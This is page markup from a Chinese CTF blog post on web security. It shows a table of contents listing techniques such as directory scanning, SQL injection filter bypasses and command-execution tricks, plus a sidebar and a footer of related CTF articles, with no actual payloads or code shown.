        meta: ["nick","mail","link"],
        requiredMeta: ["nick","mail"],
        wordLimit: 0,
        pageSize: 10,
        pageview: true,
        path: window.location.pathname,
        dark: 'html[data-theme="dark"]'
    });
}, 1000)</script></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%E6%8A%93%E5%8C%85"><span class="toc-number">1.</span> <span class="toc-text"> 1. 抓包</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2robots%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.</span> <span class="toc-text"> 2.robots 协议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3php%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-number">3.</span> <span class="toc-text"> 3.php 文件泄露</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4%E4%BD%BF%E7%94%A8dirsearch%E8%BF%9B%E8%A1%8C%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">4.</span> <span class="toc-text"> 4. 使用 dirsearch 进行目录扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4"><span class="toc-number">4.1.</span> <span class="toc-text"> 命令：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5%E6%BA%90%E7%A0%81%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%B3%84%E9%9C%B2"><span class="toc-number">5.</span> <span class="toc-text"> 5. 源码压缩包泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%89%80%E4%BB%A5%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEwwwzip%E5%8D%B3%E5%8F%AF%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%85%B6%E4%B8%AD%E5%9B%A0%E4%B8%BA%E7%BD%91%E7%AB%99%E7%9A%84%E6%96%87%E4%BB%B6%E9%83%BD%E6%94%BE%E5%9C%A8www%E4%B8%8B%E9%9D%A2%E6%89%80%E4%BB%A5%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEwwwzip%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0%E7%BD%91%E9%A1%B5%E7%9A%84%E6%BA%90%E7%A0%81%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%90%8E%E7%BC%80%E4%B8%80%E8%88%AC%E6%98%AF%E5%B8%B8%E8%A7%81%E7%9A%84zip-gz-targz-rar"><span class="toc-number">5.0.0.0.1.</span> <span class="toc-text"> 访问压缩包，所以直接访问 &#x2F;www.zip，即可下载源码压缩包，其中因为 网站的文件都放在www下面 ，所以直接访问 &#x2F;www.zip 就可以得到网页的源码压缩包 (压缩包的后缀一般是常见的 zip、gz、tar.gz、rar)</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6"><span class="toc-number">6.</span> <span class="toc-text"> 6. 版本控制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83vimvi"><span class="toc-number">7.</span> <span class="toc-text"> 7. 生产环境 vim&#x2F;vi</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8cookie"><span class="toc-number">8.</span> <span class="toc-text"> 8.cookie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9cyberchef%E7%A6%BB%E7%BA%BF%E7%89%88"><span class="toc-number">9.</span> <span class="toc-text"> 9.CyberChef 离线版</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90"><span class="toc-number">10.</span> <span class="toc-text"> 10. 域名解析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11%E5%BC%B1%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">11.</span> <span class="toc-text"> 11 弱密码爆破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3%E5%B8%A6%E6%9C%89%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">12.</span> <span class="toc-text"> 12. 技术文档带有敏感信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#13%E7%BC%96%E8%BE%91%E5%99%A8"><span class="toc-number">13.</span> <span class="toc-text"> 13. 编辑器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#14%E5%B0%9D%E8%AF%95%E7%BD%91%E9%A1%B5%E7%9A%84%E5%90%84%E4%B8%AA%E5%8A%9F%E8%83%BD"><span class="toc-number">14.</span> <span class="toc-text"> 14. 尝试网页的各个功能</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#15%E6%8E%A2%E9%92%88"><span class="toc-number">15.</span> <span class="toc-text"> 15. 探针</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#16phpinfo"><span class="toc-number">16.</span> <span class="toc-text"> 16.phpinfo</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#17%E6%9F%A5%E7%9C%8Bjs%E6%96%87%E4%BB%B6"><span class="toc-number">17.</span> <span class="toc-text"> 17. 查看 js 文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#18unicode%E7%BC%96%E7%A0%81"><span class="toc-number">18.</span> <span class="toc-text"> 18.unicode 编码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#19burpsuite%E7%88%86%E7%A0%B4"><span class="toc-number">19.</span> <span class="toc-text"> 19.BurpSuite 爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">19.1.</span> <span class="toc-text"> 流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E6%8A%93%E5%8C%85%E5%8F%91%E9%80%81%E5%88%B0intruder"><span class="toc-number">19.1.1.</span> <span class="toc-text"> 1. 抓包发送到 intruder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E9%80%89%E6%8B%A9payloads"><span class="toc-number">19.1.2.</span> <span class="toc-text"> 2. 选择 payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E7%88%86%E7%A0%B4"><span class="toc-number">19.1.3.</span> <span class="toc-text"> 3. 爆破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%9F%E8%83%BD%E8%AF%B4%E6%98%8E"><span class="toc-number">19.2.</span> <span class="toc-text"> 功能说明：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#positions"><span class="toc-number">19.2.1.</span> <span class="toc-text"> Positions</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1choose-an-attack-type%E9%80%89%E6%8B%A9%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F"><span class="toc-number">19.2.1.1.</span> <span class="toc-text"> 1.choose an attack type (选择攻击模式)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2payload-positions"><span class="toc-number">19.2.1.2.</span> <span class="toc-text"> 2.payload positions</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payloads"><span class="toc-number">19.2.2.</span> <span class="toc-text"> Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#resource-pool"><span class="toc-number">19.2.3.</span> <span class="toc-text"> Resource pool</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#settings"><span class="toc-number">19.2.4.</span> <span class="toc-text"> Settings:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#authorization%E8%AF%B7%E6%B1%82%E5%A4%B4"><span class="toc-number">20.</span> <span class="toc-text"> Authorization 请求头</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-authorization-%E5%A4%B4%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81"><span class="toc-number">20.0.1.</span> <span class="toc-text"> 使用 Authorization 头进行用户认证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81basic-authentication"><span class="toc-number">20.0.1.1.</span> <span class="toc-text"> 1. 基本认证（Basic Authentication）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E6%91%98%E8%A6%81%E8%AE%A4%E8%AF%81digest-authentication"><span class="toc-number">20.0.1.2.</span> <span class="toc-text"> 2. 摘要认证（Digest Authentication）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3token-%E8%AE%A4%E8%AF%81%E5%A6%82-bearer-%E4%BB%A4%E7%89%8Ctoken-authentication"><span class="toc-number">20.0.1.3.</span> <span class="toc-text"> 3.Token 认证，如 Bearer 令牌（Token Authentication）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4oauth"><span class="toc-number">20.0.1.4.</span> <span class="toc-text"> 4.OAuth</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#api-%E5%AF%86%E9%92%A5api-keys"><span class="toc-number">20.0.1.5.</span> <span class="toc-text"> API 密钥（API Keys）</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#http%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8Fget-post"><span class="toc-number">21.</span> <span class="toc-text"> http 请求方式（GET、POST）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python-hashlib%E5%BA%93"><span class="toc-number">22.</span> <span class="toc-text"> python hashlib 库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cookie"><span class="toc-number">23.</span> <span class="toc-text"> Cookie：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E9%9A%8F%E6%9C%BA%E6%95%B0%E8%AF%A6%E8%A7%81php%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9"><span class="toc-number">24.</span> <span class="toc-text"> PHP 随机数（详见 PHP 相关内容）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E7%88%86%E7%A0%B4"><span class="toc-number">25.</span> <span class="toc-text"> 路径爆破：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#http%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-number">26.</span> <span class="toc-text"> HTTP 状态码：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E8%A7%81%E4%B8%8B%E8%BD%BDrce%E5%8D%9A%E5%AE%A2%E7%9B%B8%E5%AF%B9%E5%85%A8%E9%9D%A2"><span class="toc-number">27.</span> <span class="toc-text"> 命令执行与代码执行（见下载 RCE 博客，相对全面）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6bypass"><span class="toc-number">27.0.0.1.</span> <span class="toc-text"> 特殊字符 bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E4%B9%89get-bypass"><span class="toc-number">27.0.0.2.</span> <span class="toc-text"> 重定义 $GET bypass</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#url%E7%BC%96%E7%A0%81"><span class="toc-number">28.</span> <span class="toc-text"> URL 编码：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#devnull-21%E4%B8%8D%E5%9B%9E%E6%98%BE%E4%BB%A5%E5%8F%8Asystem%E5%88%A9%E7%94%A8"><span class="toc-number">29.</span> <span class="toc-text"> &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 不回显，以及 system 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">29.1.</span> <span class="toc-text"> 绕过：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#system%E5%88%A9%E7%94%A8"><span class="toc-number">29.1.1.</span> <span class="toc-text"> system 利用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell%E6%97%A0%E6%95%B0%E5%AD%97-%E5%AD%97%E6%AF%8D%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9C%89system%E4%BD%86%E8%BF%87%E6%BB%A4%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D"><span class="toc-number">29.1.2.</span> <span class="toc-text"> 无字母数字 webshell（无数字、字母命令执行【有 system 但过滤数字和字母】）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">29.1.2.1.</span> <span class="toc-text"> 1. 利用方法:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E5%8E%9F%E7%90%86"><span class="toc-number">29.1.2.2.</span> <span class="toc-text"> 2. 原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E6%9E%84%E9%80%A0%E5%87%BA%E6%95%B0%E5%AD%97%E5%88%A9%E7%94%A8shell%E7%9A%84%E5%8A%9F%E8%83%BD"><span class="toc-number">29.1.2.3.</span> <span class="toc-text"> 3. 构造出数字（利用 shell 的功能）</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">30.</span> <span class="toc-text"> SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E5%88%A4%E6%96%AD%E5%8F%82%E6%95%B0%E7%B1%BB%E5%9E%8B"><span class="toc-number">30.1.</span> <span class="toc-text"> 1. 判断参数类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">30.2.</span> <span class="toc-text"> 2. 字符型注入判断闭合方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0c-%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">30.2.1.</span> <span class="toc-text"> 0x0c 常见过滤绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="toc-number">30.3.</span> <span class="toc-text"> 3. 绕过过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">30.3.1.</span> <span class="toc-text"> 1. 绕过关键字过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7"><span class="toc-number">30.4.</span> <span class="toc-text"> 2. 过滤逗号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">30.5.</span> <span class="toc-text"> 3. 过滤空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E8%BF%87%E6%BB%A4%E7%AD%89%E5%8F%B7"><span class="toc-number">30.6.</span> <span class="toc-text"> 4. 过滤等号</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E8%BF%87%E6%BB%A4%E5%A4%A7%E4%BA%8E%E5%B0%8F%E4%BA%8E%E5%8F%B7"><span class="toc-number">30.6.0.1.</span> <span class="toc-text"> 5、过滤大于小于号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">30.6.0.2.</span> <span class="toc-text"> 6. 等价函数绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E6%A0%B9%E6%8D%AE%E6%B3%A8%E5%85%A5%E6%83%85%E5%86%B5%E4%BD%BF%E7%94%A8%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-number">30.6.1.</span> <span class="toc-text"> 6. 根据注入情况使用注入方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">30.6.1.1.</span> <span class="toc-text"> 联合查询注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%B0%86id%E5%80%BC%E8%AE%BE%E7%BD%AE%E4%B8%BA0%E6%88%96%E8%80%85%E8%B4%9F%E6%95%B0%E7%9A%84%E8%A7%A3%E9%87%8A"><span class="toc-number">30.6.1.2.</span> <span class="toc-text"> 关于将 id 值设置为 0 或者负数的解释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">30.6.1.3.</span> <span class="toc-text"> 报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">30.6.1.4.</span> <span class="toc-text"> 布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">30.6.1.5.</span> <span class="toc-text"> 时间盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">30.6.2.</span> <span class="toc-text"> 7. 使用工具进行注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1sqlmap"><span class="toc-number">30.6.2.1.</span> <span class="toc-text"> 1.sqlmap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2union"><span class="toc-number">30.7.</span> <span class="toc-text"> 联合查询 union</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by"><span class="toc-number">30.8.</span> <span class="toc-text"> order by</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E4%BD%9C%E7%94%A8"><span class="toc-number">30.8.1.</span> <span class="toc-text"> 1. 作用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E4%BD%BF%E7%94%A8"><span class="toc-number">30.8.2.</span> <span class="toc-text"> 2. 使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E6%8C%89%E5%AD%97%E6%AE%B5%E5%90%8D%E5%88%97%E5%90%8D%E8%BF%9B%E8%A1%8C%E6%8E%92%E5%BA%8F"><span class="toc-number">30.8.2.1.</span> <span class="toc-text"> 1. 按字段名（列名）进行排序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E6%8C%89%E5%88%97%E7%B4%A2%E5%BC%95%E7%BB%A7%E7%BB%AD%E6%8E%92%E5%BA%8F"><span class="toc-number">30.8.2.2.</span> <span class="toc-text"> 2. 按列索引继续排序</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">30.9.</span> <span class="toc-text"> sql 注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%88%A4%E6%96%AD%E8%A1%A8%E6%9C%89%E5%87%A0%E5%88%97%E5%87%A0%E8%A1%8C"><span class="toc-number">30.9.1.</span> <span class="toc-text"> 1. 判断表有几列几行：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">30.9.2.</span> <span class="toc-text"> 2. 获取表名：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="toc-number">30.9.3.</span> <span class="toc-text"> 3. 获取列名：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="toc-number">30.9.4.</span> <span class="toc-text"> 4. 获取信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E8%BF%87%E6%BB%A4"><span class="toc-number">30.10.</span> <span class="toc-text"> 判断过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88"><span class="toc-number">30.10.1.</span> <span class="toc-text"> 1. 判断闭合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%88%A4%E6%96%AD%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">30.10.2.</span> <span class="toc-text"> 2. 判断过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">30.10.3.</span> <span class="toc-text"> 3. 绕过过滤注释符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">30.10.4.</span> <span class="toc-text"> 4. 布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E7%BB%95%E8%BF%87where%E8%BF%87%E6%BB%A4"><span class="toc-number">30.10.5.</span> <span class="toc-text"> 5. 绕过 where 过滤：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E7%BB%95%E8%BF%87%E5%8D%95-%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">30.10.6.</span> <span class="toc-text"> 6. 绕过单、双引号过滤</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="vvwwv" data-src="/assets/avatar.jpg"/><p class="name" itemprop="name">vvwwv</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">86</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">61</span><span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">22</span><span class="name">标签</span></a></div></nav><div class="social"><a href="https://github.com/cyb141520" class="item github" rel="noopener" title="https:&#x2F;&#x2F;github.com&#x2F;cyb141520" target="_blank"><i class="ic i-github"></i></a><a href="/1415206596@qq.com" class="item email" title="1415206596@qq.com"><i class="ic i-envelope"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-user"></i>关于</a><ul class="submenu"><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于本站</a></li><li class="item"><a href="/admiration/" rel="section"><i class="ic i-coffee"></i>赞赏博主</a></li></ul></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2025/05/19/web/PHP%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/CTF/Linux/" title="分类于Linux">Linux</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/CTF/Linux/ASLR/" title="分类于ASLR">ASLR</a></div><span><a href="/2023/10/04/Linux/ASLR%E4%B8%8EPIE/">ASLR与PIE（例题：CTFshow的pwn31）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a></div><span><a href="/2023/11/22/pwn/%E6%94%BB%E9%98%B2%E4%BD%9C%E4%B8%9A/">攻防作业4(缓冲区溢出)</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java/" title="分类于Java">Java</a></div><span><a href="/2023/09/10/Java/Java%E4%BD%9C%E4%B8%9A2/">Java作业2023/9/10(作业7)</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a></div><span><a href="/2023/05/04/pwn/webpwn/phppwn/">webpwn初学习（php篇）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/BUUCTF/" title="分类于BUUCTF">BUUCTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/BUUCTF/UAF/" title="分类于UAF">UAF</a></div><span><a href="/2023/10/01/pwn/%E5%88%B7%E9%A2%98/BUUCTF/hitcontraining_uaf/">hitcontraining_uaf（use after free）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/CTFshow/" title="分类于CTFshow">CTFshow</a><i class="ic i-angle-right"></i><a href="/categories/CTF/CTFshow/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="分类于栈溢出">栈溢出</a></div><span><a href="/2023/10/26/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow69-79/">CTFshow(栈溢出部分,69~80)</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/web/" title="分类于web">web</a></div><span><a href="/2023/11/14/web/DVWA/">web安全初探（）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/BUUCTF/" title="分类于BUUCTF">BUUCTF</a></div><span><a href="/2025/05/19/pwn/%E5%88%B7%E9%A2%98/BUUCTF/cmcc_simplerop/">cmcc_simplerop（mprotect）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/BUUCTF/" title="分类于BUUCTF">BUUCTF</a></div><span><a href="/2023/10/27/pwn/%E5%88%B7%E9%A2%98/BUUCTF/xdctf2015_pwn200/">xdctf2015_pwn200（栈溢出）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/CTF/Linux/" title="分类于Linux">Linux</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/CTF/Linux/FORTIFY/" title="分类于FORTIFY">FORTIFY</a></div><span><a href="/2023/10/07/Linux/FORTIFY/">FORTIFY_SOURCE（例题：CTFshow的pwn32）</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2><ul class="leancloud-recent-comment" id="new-comment"><li class="item" v-for="com in coms"><a v-bind:href="root + com.href" data-pjax-state="data-pjax-state"><span class="breadcrumb">{{com.nick}} @ {{com.time}}</span><span>{{com.text}}<br/></span></a></li></ul></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2025</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">vvwwv @ vvwwv'Blog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">680k 字</span><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">10:18</span></div><div 